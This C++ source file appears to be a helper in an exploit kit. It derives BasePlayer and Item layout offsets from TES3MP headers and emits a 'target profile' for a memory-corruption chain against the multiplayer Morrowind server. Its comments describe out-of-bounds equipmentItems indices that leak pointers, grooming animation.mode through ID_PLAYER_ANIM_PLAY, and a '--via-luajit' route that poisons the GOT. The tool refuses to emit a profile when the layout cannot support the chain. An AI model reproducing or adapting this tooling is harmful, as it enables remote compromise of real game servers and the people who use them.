// gen-profile: derive the class-layout half of a target profile from TES3MP's own headers.
//
// WHY THIS EXISTS
//     Three of the numbers this chain depends on are not ELF metadata and cannot be recovered by
//     any amount of symbol resolution: where equipmentItems sits inside BasePlayer, how wide an
//     Item is, and which two out-of-bounds indices land on the fields the chain needs. They are
//     facts about a C++ class layout. They were originally MEASURED in a debugger against one
//     build, which is exactly the kind of constant that silently rots when a field is added
//     upstream: the chain would not fail cleanly, it would read the wrong member.
//
//     So compute them instead. The compiler already knows the answer.
//
// BUILD (on a Linux box with the TES3MP tree; the ABI must match the TARGET, so building this on
// macOS against libc++ produces wrong numbers and the assertions below will not catch it):
//     clang++ -std=c++17 -I<TES3MP> -include cstdint -Wno-invalid-offsetof \
//             tools/gen-profile.cc -o gen-profile
//
// offsetof on a non-standard-layout type is conditionally supported. GCC and Clang both implement
// it correctly for this case, which is why -Wno-invalid-offsetof is a suppression rather than a
// workaround.
#include <cstdio>
#include <cstddef>
#include <cstdint>
#include <components/openmw-mp/Base/BasePlayer.hpp>

using mwmp::BasePlayer;
using mwmp::Item;
using mwmp::Animation;

int main(int argc, char **argv)
{
    const char *name = argc > 1 ? argv[1] : "derived";

    const size_t equip   = offsetof(BasePlayer, equipmentItems);
    const size_t stride  = sizeof(Item);
    const size_t coff    = offsetof(Item, count);
    const size_t chat    = offsetof(BasePlayer, chatMessage);
    const size_t creat   = offsetof(BasePlayer, creatureRefId);
    // The groom target is animation.MODE specifically, not the start of the Animation struct:
    // Animation leads with a std::string groupname, so mode sits 32 bytes in. Anchoring the check
    // on `animation` alone is off by exactly that string and rejects a layout that is in fact fine.
    const size_t animmode = offsetof(BasePlayer, animation) + offsetof(Animation, mode);
    // Animation leads with a 32-byte std::string groupname, so offsetof(BasePlayer, animation) is
    // also &animation.groupname._M_p. --via-luajit poisons the target GOT through that string,
    // because ID_PLAYER_ANIM_PLAY assigns it and its processor calls no Lua callback -- the one
    // write path in the chain that does not spend the hijacked slot on a callback name.
    const size_t animgrp  = offsetof(BasePlayer, animation);

    int rc = 0;
    // An out-of-bounds index i puts Item[i].count|charge at equip + stride*i + coff. For a field to
    // be reachable AT ALL that has to land exactly on it, so exact divisibility is the property
    // that says "this layout still supports the chain" rather than "here is an approximate index".
    auto idx_for = [&](const char *what, size_t field, size_t &out) {
        if (field < equip + coff) { fprintf(stderr, "FAIL: %s at %zu is below the array\n", what, field); rc = 1; return; }
        size_t d = field - equip - coff;
        if (d % stride) {
            fprintf(stderr, "FAIL: %s at %zu is %zu past equipmentItems[0].count, not a multiple of "
                            "the %zu-byte stride. No index lands on it, so the chain cannot reach it "
                            "in this build.\n", what, field, d, stride);
            rc = 1; return;
        }
        out = d / stride;
    };

    size_t heap_idx = 0, self_idx = 0;
    idx_for("chatMessage._M_p",   chat,  heap_idx);
    idx_for("creatureRefId._M_p", creat, self_idx);

    // Index `self_idx`'s refId OBJECT (not its count|charge) must land on attacker-settable memory,
    // because the truncated packet assigns an empty string through it and _M_set_length(0) writes a
    // NUL through _M_p. animation.mode|count is settable via ID_PLAYER_ANIM_PLAY, which is what
    // makes that write survivable. If a field moves and this stops holding, step 2 has nowhere to
    // groom and the chain dies at the clobber rather than at a leak.
    if (rc == 0 && equip + stride * self_idx != animmode) {
        fprintf(stderr, "FAIL: index %zu's refId OBJECT lands at %zu, but animation.mode is at %zu.\n"
                        "      Step 2 parks the scratch pointer in animation.mode|count via\n"
                        "      ID_PLAYER_ANIM_PLAY so that index %zu's empty-string assignment writes its\n"
                        "      NUL terminator somewhere valid. If the object no longer lands there the\n"
                        "      clobber has no settable memory under it and faults instead.\n",
                self_idx, equip + stride * self_idx, animmode, self_idx);
        rc = 1;
    }
    if (rc) { fprintf(stderr, "\nLayout is not compatible with this chain. Not emitting a profile.\n"); return rc; }

    printf("# generated by gen-profile from this tree's headers. Do not hand-edit.\n");
    printf("name           = %s\n", name);
    printf("equip_off      = %#zx\n", equip);
    printf("item_stride    = %zu\n", stride);
    printf("item_count_off = %zu\n", coff);
    printf("leak_heap_idx  = %zu\n", heap_idx);
    printf("leak_self_idx  = %zu\n", self_idx);
    // creatureRefId stays in small-string form, so its _M_p points at its own SSO buffer 16 bytes in.
    printf("self_ptr_delta = %#zx\n", creat + 16);
    printf("scratch_field  = chatMessage\n");
    // Recorded so the profile states WHY index leak_self_idx is survivable, rather than leaving it
    // as a bare number that happens to work.
    printf("groom_off      = %#zx   # animation.mode, settable via ID_PLAYER_ANIM_PLAY\n", animmode);
    printf("anim_group_off = %#zx   # &animation.groupname._M_p, the --via-luajit write path\n", animgrp);
    fprintf(stderr, "ok: sizeof(BasePlayer)=%zu equip=%zu stride=%zu heap_idx=%zu self_idx=%zu\n",
            sizeof(BasePlayer), equip, stride, heap_idx, self_idx);
    return 0;
}
